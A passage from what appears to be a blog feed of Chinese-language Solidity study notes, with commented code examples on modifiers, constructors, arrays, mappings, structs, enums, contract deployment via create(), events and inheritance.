require(!paused,<span class="string">&quot;paused&quot;</span>);</span><br><span class="line">        _;<span class="comment">//表示函数其他代码在哪里运行,既运行到下划线就会跳入函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external whenpaused&#123;</span><br><span class="line">        <span class="comment">//require(!paused,&quot;paused&quot;);把两个函数相同的require拿出来用函数修改器</span></span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">dec</span><span class="params">()</span>external whenpaused&#123;</span><br><span class="line">        <span class="comment">//require(!paused,&quot;paused&quot;);</span></span><br><span class="line">        count-=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">cap</span><span class="params">(uint x)</span>&#123;</span><br><span class="line">        require(x&lt;<span class="number">100</span>,<span class="string">&quot;x&gt;=100&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">incBy</span><span class="params">(uint x)</span>external whenpaused <span class="title function_">cap</span><span class="params">(x)</span>&#123;<span class="comment">//先检查第一个是否满足，然后传入入参数到第二个修改器进行判断</span></span><br><span class="line">        count+=x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier <span class="title function_">sandwich</span><span class="params">()</span>&#123;<span class="comment">//三明治修改器</span></span><br><span class="line">        count +=<span class="number">10</span>;</span><br><span class="line">        _;</span><br><span class="line">        count *=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>external sandwich&#123;<span class="comment">//先加10，再加1，最后乘2；</span></span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的 owner 地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Constructor&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint public x;</span><br><span class="line">    constructor(uint _x)&#123;<span class="comment">//构造函数一般用于初始化变量,部署前传入_x的值</span></span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结1"><a href="#总结1" class="headerlink" title="总结1"></a>总结1</h2><p>前面内容的合成<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: HIT</span></span><br><span class="line">pragma solidity^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract Ownable&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">onlyOwnable</span><span class="params">()</span>&#123;</span><br><span class="line">        require(msg.sender==owner ,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setowner</span><span class="params">(address _newOwner)</span>external onlyOwnable&#123;</span><br><span class="line">        require(_newOwner!=address(<span class="number">0</span>),<span class="string">&quot;invalid address&quot;</span>);</span><br><span class="line">        owner=_newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">onlyOwner</span><span class="params">()</span>external onlyOwnable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">anyone</span><span class="params">()</span>external&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="returns的写法"><a href="#returns的写法" class="headerlink" title="returns的写法"></a>returns的写法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract functionoutput&#123;<span class="comment">//返回写法</span></span><br><span class="line">    function <span class="title function_">returnMany</span><span class="params">()</span>public pure <span class="title function_">returns</span> <span class="params">(uint , <span class="type">bool</span> )</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">named</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint x,<span class="type">bool</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">assigned</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint x,<span class="type">bool</span> b)</span>&#123;</span><br><span class="line">        x=<span class="number">1</span>;b=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function  <span class="title function_">destructing</span><span class="params">()</span>public pure&#123;<span class="comment">//接收返回值</span></span><br><span class="line">        uint x;<span class="type">bool</span> b;</span><br><span class="line">        ( x , b )=returnMany();</span><br><span class="line">        (, b)=returnMany();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的知识点"><a href="#数组的知识点" class="headerlink" title="数组的知识点"></a>数组的知识点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Array&#123;<span class="comment">//数组知识点</span></span><br><span class="line">    uint[]public nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];<span class="comment">//动态数组</span></span><br><span class="line">    uint[<span class="number">3</span>]public numsfixed=[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];<span class="comment">//固定数组</span></span><br><span class="line">    uint public x;</span><br><span class="line">    uint public len;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        nums.push(<span class="number">4</span>);   <span class="comment">//[1,2,3,4]</span></span><br><span class="line">         x=nums[<span class="number">1</span>];</span><br><span class="line">        nums[<span class="number">2</span>]=<span class="number">777</span>;   <span class="comment">//[1,2,777,4]</span></span><br><span class="line">        delete nums[<span class="number">1</span>];  <span class="comment">//[1,0,777,4]</span></span><br><span class="line">        nums.pop();  <span class="comment">//[1,0,777]</span></span><br><span class="line">        len=nums.length;  <span class="comment">//数组长度</span></span><br><span class="line">        uint []memory a=new uint[](<span class="number">5</span>);  <span class="comment">//内存中只能固定数组，不能用上面内容</span></span><br><span class="line">        a[<span class="number">1</span>]=<span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">returnarray</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint[] memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nums; <span class="comment">//返回数组所有的元素</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的删除函数"><a href="#数组的删除函数" class="headerlink" title="数组的删除函数"></a>数组的删除函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract ArrayShift&#123;</span><br><span class="line">    uint []public arr;</span><br><span class="line">    function <span class="title function_">example</span><span class="params">()</span>public &#123;</span><br><span class="line">        arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">        delete arr[<span class="number">1</span>];<span class="comment">//[1,0,3]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//[1,2,3]--remove(1)--&gt;[1,3,3]--&gt;[1,3]</span></span><br><span class="line">    function <span class="title function_">remove</span><span class="params">(uint _index)</span>public&#123;<span class="comment">//闪出数组中的元素</span></span><br><span class="line">        require(_index&lt;arr.length,<span class="string">&quot;index out of bound&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint i=_index;i&lt;arr.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            arr[i]=arr[i+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        arr.pop();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Mapping&#123;</span><br><span class="line">    uint bal;</span><br><span class="line">    uint bal2;</span><br><span class="line">    mapping(address =&gt;uint)public balances;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;<span class="type">bool</span>))public isFriend;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        balances[msg.sender]=<span class="number">123</span>;</span><br><span class="line">        bal =balances[msg.sender];</span><br><span class="line">        bal2=balances[address(<span class="number">1</span>)];<span class="comment">//默认 0</span></span><br><span class="line">        balances[msg.sender]+=<span class="number">456</span>;</span><br><span class="line">        delete balances[msg.sender];<span class="comment">//delete并不是删除，而是回归默认值</span></span><br><span class="line">        isFriend[msg.sender][address(this)]=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="映射与数组的结合，高价值"><a href="#映射与数组的结合，高价值" class="headerlink" title="映射与数组的结合，高价值"></a>映射与数组的结合，高价值</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract iterableMapping&#123;<span class="comment">//将数组与映射结合</span></span><br><span class="line">    mapping(address=&gt;uint)public balances;</span><br><span class="line">    mapping(address=&gt;<span class="type">bool</span>)public inserted;</span><br><span class="line">    address[]public keys;</span><br><span class="line">    function <span class="title function_">set</span><span class="params">(address _key,uint _val)</span>external&#123;</span><br><span class="line">        balances[_key]=_val;</span><br><span class="line">        <span class="keyword">if</span>(!inserted[_key])&#123;</span><br><span class="line">            inserted[_key]=<span class="literal">true</span>;</span><br><span class="line">            keys.push(_key);<span class="comment">//增加地址到数组，从而实现遍历</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getsize</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> keys.length;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">first</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[<span class="number">0</span>]];<span class="comment">//第一个地址的余额</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">last</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[keys.length<span class="number">-1</span>]];<span class="comment">//最后一个地址的余额</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">get</span><span class="params">(uint i)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[i]];<span class="comment">//任意一个地址的余额</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="结构体的定义方法与数组组合"><a href="#结构体的定义方法与数组组合" class="headerlink" title="结构体的定义方法与数组组合"></a>结构体的定义方法与数组组合</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Struct&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Car</span>&#123;</span></span><br><span class="line">        <span class="built_in">string</span> model;</span><br><span class="line">        uint year;</span><br><span class="line">        address owner;</span><br><span class="line">    &#125;</span><br><span class="line">    Car public car;</span><br><span class="line">    Car[] public cars;<span class="comment">//可通过这里查看数组</span></span><br><span class="line">    mapping(address =&gt;Car[])public carsByOwner;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        Car memory toyota=Car(<span class="string">&quot;Toyota&quot;</span>,<span class="number">1990</span>,msg.sender);</span><br><span class="line">        Car memory lambo=Car(&#123;year:<span class="number">1980</span>,model:<span class="string">&quot;Lamborghini&quot;</span>,owner:msg.sender&#125;);<span class="comment">//顺序可换换</span></span><br><span class="line">        Car memory tesla;</span><br><span class="line">        tesla.model=<span class="string">&quot;Tesla&quot;</span>;</span><br><span class="line">        tesla.year=<span class="number">2010</span>;</span><br><span class="line">        tesla.owner=msg.sender;</span><br><span class="line">        cars.push(toyota);</span><br><span class="line">        cars.push(lambo);</span><br><span class="line">        cars.push(tesla);</span><br><span class="line">        cars.push(Car(<span class="string">&quot;Ferrari&quot;</span>,<span class="number">2020</span>,msg.sender));</span><br><span class="line">        Car storage _car=cars[<span class="number">0</span>];</span><br><span class="line">        _car.year=<span class="number">1999</span>;</span><br><span class="line">        delete _car.owner;</span><br><span class="line">        delete cars[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举的用法"><a href="#枚举的用法" class="headerlink" title="枚举的用法"></a>枚举的用法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">contract Enum&#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">Status</span>&#123;</span></span><br><span class="line">        None,</span><br><span class="line">        Pending,</span><br><span class="line">        Shipped,</span><br><span class="line">        Completed,</span><br><span class="line">        Rejected,</span><br><span class="line">        Canceled</span><br><span class="line">    &#125;<span class="comment">//分别对应 0，1，2，3，4，5</span></span><br><span class="line">    Status public status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Order</span>&#123;</span></span><br><span class="line">        address buyer;</span><br><span class="line">        Status status;</span><br><span class="line">    &#125;</span><br><span class="line">    Order[]public orders;</span><br><span class="line">    function <span class="title function_">get</span><span class="params">(Status _status)</span> external <span class="title function_">returns</span><span class="params">(Status)</span>&#123;<span class="comment">//输入枚举的序号，得到枚举的序号</span></span><br><span class="line">        status=_status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">ship</span><span class="params">()</span>external&#123;</span><br><span class="line">        status=Status.Shipped;<span class="comment">//调用后得到2；</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">reset</span><span class="params">()</span>external&#123;</span><br><span class="line">        delete status;<span class="comment">//删除，变成默认值0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="通过合约部署合约-懵点"><a href="#通过合约部署合约-懵点" class="headerlink" title="通过合约部署合约(懵点)"></a>通过合约部署合约(懵点)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//合约1：设定谁为owner</span></span><br><span class="line">contract TestContract1&#123;</span><br><span class="line">    address public owner = msg.sender;</span><br><span class="line">    function <span class="title function_">setOwner</span><span class="params">(address _owner)</span>public&#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        owner=_owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//合约2</span></span><br><span class="line">contract TestContract2&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    uint public value=msg.value;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public y;</span><br><span class="line">    constructor(uint _x,uint _y)payable&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">        y=_y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代理合约，用来部署合约1和2</span></span><br><span class="line">contract Proxy&#123;</span><br><span class="line">    event <span class="title function_">Deploy</span><span class="params">(address)</span>;</span><br><span class="line">    function <span class="title function_">deploy</span><span class="params">(bytes memory _code)</span>external payable <span class="title function_">returns</span><span class="params">(address addr)</span>&#123;<span class="comment">//隐式返回：returns后面定义了名称，自动返回</span></span><br><span class="line">        <span class="comment">//获得部署合约的地址</span></span><br><span class="line">        assembly&#123;<span class="comment">//内联汇编</span></span><br><span class="line">            <span class="comment">//create(v,p,n)</span></span><br><span class="line">            <span class="comment">//v代表部署合约发送的币的数量</span></span><br><span class="line">            <span class="comment">//p代表内存中机器码开始的位置</span></span><br><span class="line">            <span class="comment">//n代表机器码内存的大小</span></span><br><span class="line">            addr :=create(callvalue(),add(_code,<span class="number">0x20</span>),mload(_code))<span class="comment">//msg.value在这里不行,addr用来接收返回的地址</span></span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        require(addr!=address(<span class="number">0</span>),<span class="string">&quot;deploy failed&quot;</span>);</span><br><span class="line">        emit <span class="title function_">Deploy</span><span class="params">(addr)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">execute</span><span class="params">(address _target,bytes memory _date)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success, )=_target.call&#123;value:msg.value&#125;(_date);</span><br><span class="line">        require(success,<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//助手合约，用来得到合约1和2或者合约中函数的code</span></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    <span class="comment">//获取呼叫合约1的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode1</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract1).creationCode;<span class="comment">//特定方法</span></span><br><span class="line">        <span class="keyword">return</span> bytecode;<span class="comment">//没有构造函数的这莫写</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约2的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode2</span><span class="params">(uint _x,uint _y)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract2).creationCode;<span class="comment">//特定方法</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_x,_y));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约1中setOwner的所需要的代码</span></span><br><span class="line">    function <span class="title function_">getCalldate</span><span class="params">(address _owner)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;<span class="comment">//_owner为传入合约1中函数的参数</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodeWithSignature(<span class="string">&quot;setOwner(address)&quot;</span>,_owner);<span class="comment">//特定方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的第二篇文章</title>
      <link href="/2022/10/28/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/28/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      
      
      <categories>
          
          <category> -c语言学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础知识点（二）</title>
      <link href="/2022/10/28/solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2022/10/28/solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity基础知识点（二）"><a href="#solidity基础知识点（二）" class="headerlink" title="solidity基础知识点（二）"></a>solidity基础知识点（二）</h1><h2 id="事件知识点"><a href="#事件知识点" class="headerlink" title="事件知识点"></a>事件知识点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Event &#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> message,uint val)</span>;</span><br><span class="line">    event <span class="title function_">IndexedLog</span><span class="params">(address indexed sender,uint val)</span>;</span><br><span class="line">    function <span class="title function_">example</span><span class="params">()</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;foo&quot;</span>,<span class="number">123</span>)</span>;</span><br><span class="line">        emit <span class="title function_">IndexedLog</span><span class="params">(msg.sender,<span class="number">123</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event <span class="title function_">Message</span><span class="params">(address indexed _from,address indexed _to,<span class="built_in">string</span> message)</span>;</span><br><span class="line">    function <span class="title function_">sendMessage</span><span class="params">(address _to,<span class="built_in">string</span> calldata message)</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Message</span><span class="params">(msg.sender,_to,message)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承与多线继承"><a href="#继承与多线继承" class="headerlink" title="继承与多线继承"></a>继承与多线继承</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span>  public  virtual <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;<span class="comment">//需要被继承的合约要加virtual</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public virtual <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Aa</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract B is A&#123;</span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span> public virtual override <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;<span class="comment">//加继承的函数加override</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public virtual override <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Bb</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract C is A, B&#123;<span class="comment">//多线继承，最基础的放在最前面，然后依次排列</span></span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span>public pure <span class="title function_">override</span><span class="params">(A,B)</span> <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">       <span 